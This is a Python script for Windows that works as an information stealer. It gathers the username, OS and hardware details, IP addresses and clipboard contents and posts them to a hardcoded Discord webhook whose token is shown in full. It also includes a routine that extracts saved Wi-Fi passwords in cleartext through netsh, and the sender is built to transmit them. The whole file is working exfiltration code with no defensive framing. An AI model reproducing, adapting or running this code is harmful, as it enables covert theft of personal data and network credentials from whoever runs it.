import os
import json
import wmi
import platform
import psutil
import subprocess
import socket
from datetime import datetime
import requests
from tkinter import Tk


def get_system_info():
    c = wmi.WMI()
    system_info = {
        "Username": os.getlogin(),
        "OS": platform.system() + " " + platform.release(),
        "System": platform.machine(),
        "Node Name": platform.node(),
        "System Manufacturer": "Unknown",
        "System Model": "Unknown",
        "BIOS Version": "Unknown",
        "Uptime": "Unknown"
    }
    for os_info in c.Win32_OperatingSystem():
        system_info["OS"] = os_info.Caption
        last_boot = datetime.strptime(os_info.LastBootUpTime.split('.')[0], "%Y%m%d%H%M%S")
        uptime = datetime.now() - last_boot
        uptime_days = uptime.days
        uptime_hours, remainder = divmod(uptime.seconds, 3600)
        uptime_minutes, _ = divmod(remainder, 60)
        system_info["Uptime"] = f"{uptime_days} days, {uptime_hours} hours, {uptime_minutes} minutes"
    for cs in c.Win32_ComputerSystem():
        system_info["System Manufacturer"] = cs.Manufacturer
        system_info["System Model"] = cs.Model if cs.Model.lower() != "system product name" else "Unknown"
    for bios in c.Win32_BIOS():
        system_info["BIOS Version"] = bios.SMBIOSBIOSVersion
    return system_info

def get_pc_components():
    c = wmi.WMI()
    components = {
        "CPU": "Unknown",
        "GPU": [],
        "Motherboard": "Unknown",
        "RAM": [],
        "Storage": []
    }
    for cpu in c.Win32_Processor():
        components["CPU"] = cpu.Name
    for gpu in c.Win32_VideoController():
        components["GPU"].append(gpu.Name)
    for board in c.Win32_BaseBoard():
        components["Motherboard"] = board.Product
    for mem in c.Win32_PhysicalMemory():
        ram_info = f"{mem.Manufacturer} {str(int(mem.Capacity) // (1024**3))}GB `{mem.PartNumber.strip()}`"
        components["RAM"].append(ram_info)
    for disk in c.Win32_DiskDrive():
        components["Storage"].append(disk.Model)
    return components

def get_saved_wifi():
    wifi_list = []
    try:
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
        profiles = [line.split(":")[1].strip() for line in result.stdout.split("\n") if "All User Profile" in line]
        for profile in profiles:
            result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True)
            ssid = profile
            key_content = None
            for line in result.stdout.split("\n"):
                if "Key Content" in line:
                    key_content = line.split(":")[1].strip()
                    break
            wifi_list.append({"SSID": ssid, "Password": key_content})
    except Exception as e:
        wifi_list.append({"Error": str(e)})
    return wifi_list

def get_network_adapters():
    network_adapters = psutil.net_if_addrs()
    ip_info = {}
    for interface, addrs in network_adapters.items():
        for addr in addrs:
            if addr.family == socket.AF_INET:
                ip_info[interface] = addr.address
    return ip_info

def get_clipboard_content():
    clipboard_content = None
    root = None
    try:
        root = Tk()
        root.withdraw()
        clipboard_content = root.clipboard_get()
    finally:
        if root:
            root.destroy()
    
    return clipboard_content or "Empty"

def send_to_discord(system_info=None, components=None, wifi_info=None, network_adapters=None, clipboard_content=None):
    webhook_url = "https://discord.com/api/webhooks/1244749050658553957/H8ESu_m5VKLpy6YW8JiH5AxqQIgZoOUQwGN-jSNn54ltHi2_gQj4eJpn0O-MOMDEJwA2"
    
    def create_embed(title, fields):
        fields = [field for field in fields if field["value"]]
        if fields:
            return {"title": title, "fields": fields}
        return None
    
    embeds = []
    
    if system_info:
        system_info_fields = [
            {"name": "Username", "value": system_info["Username"]},
            {"name": "OS", "value": system_info["OS"]},
            {"name": "System", "value": system_info["System"]},
            {"name": "Node Name", "value": system_info["Node Name"]},
            {"name": "System Manufacturer", "value": system_info["System Manufacturer"]},
            {"name": "System Model", "value": system_info["System Model"]},
            {"name": "BIOS Version", "value": system_info["BIOS Version"]},
            {"name": "Uptime", "value": system_info["Uptime"]}
        ]
        system_info_embed = create_embed("System Information", system_info_fields)
        if system_info_embed:
            embeds.append(system_info_embed)
    
    if components:
        components_fields = [
            {"name": "CPU", "value": components["CPU"]},
            {"name": "GPU", "value": "\n".join(components["GPU"])},
            {"name": "Motherboard", "value": components["Motherboard"]},
            {"name": "RAM", "value": "\n".join(components["RAM"])},
            {"name": "Storage", "value": "\n".join(components["Storage"])}
        ]
        components_embed = create_embed("Components", components_fields)
        if components_embed:
            embeds.append(components_embed)
    
    if wifi_info:
        wifi_fields = [{"name": "SSID", "value": f"{wifi['SSID']} - Password: {wifi['Password']}" if wifi['Password'] else wifi['SSID']} for wifi in wifi_info]
        wifi_embed = create_embed("Saved Wi-Fi Networks", wifi_fields)
        if wifi_embed:
            embeds.append(wifi_embed)
    
    if network_adapters:
        ip_fields = [{"name": interface, "value": ip} for interface, ip in network_adapters.items()]
        ip_embed = create_embed("Network Adapters", ip_fields)
        if ip_embed:
            embeds.append(ip_embed)
    
    if clipboard_content:
        clipboard_fields = [{"name": "Clipboard Content", "value": clipboard_content}]
        clipboard_embed = create_embed("Clipboard", clipboard_fields)
        if clipboard_embed:
            embeds.append(clipboard_embed)
    
    if embeds:
        data = {"embeds": embeds}
        headers = {"Content-Type": "application/json"}
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
        if response.status_code == 204:
            print("Message sent successfully.")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")
    else:
        print("No data to send.")

def main():
    system_info = get_system_info()
    components = get_pc_components()
    network_adapters = get_network_adapters()
    clipboard_content = get_clipboard_content()
    send_to_discord(
        system_info=system_info,
        components=components,
        network_adapters=network_adapters,
        clipboard_content=clipboard_content,
    )

if __name__ == "__main__":
    main()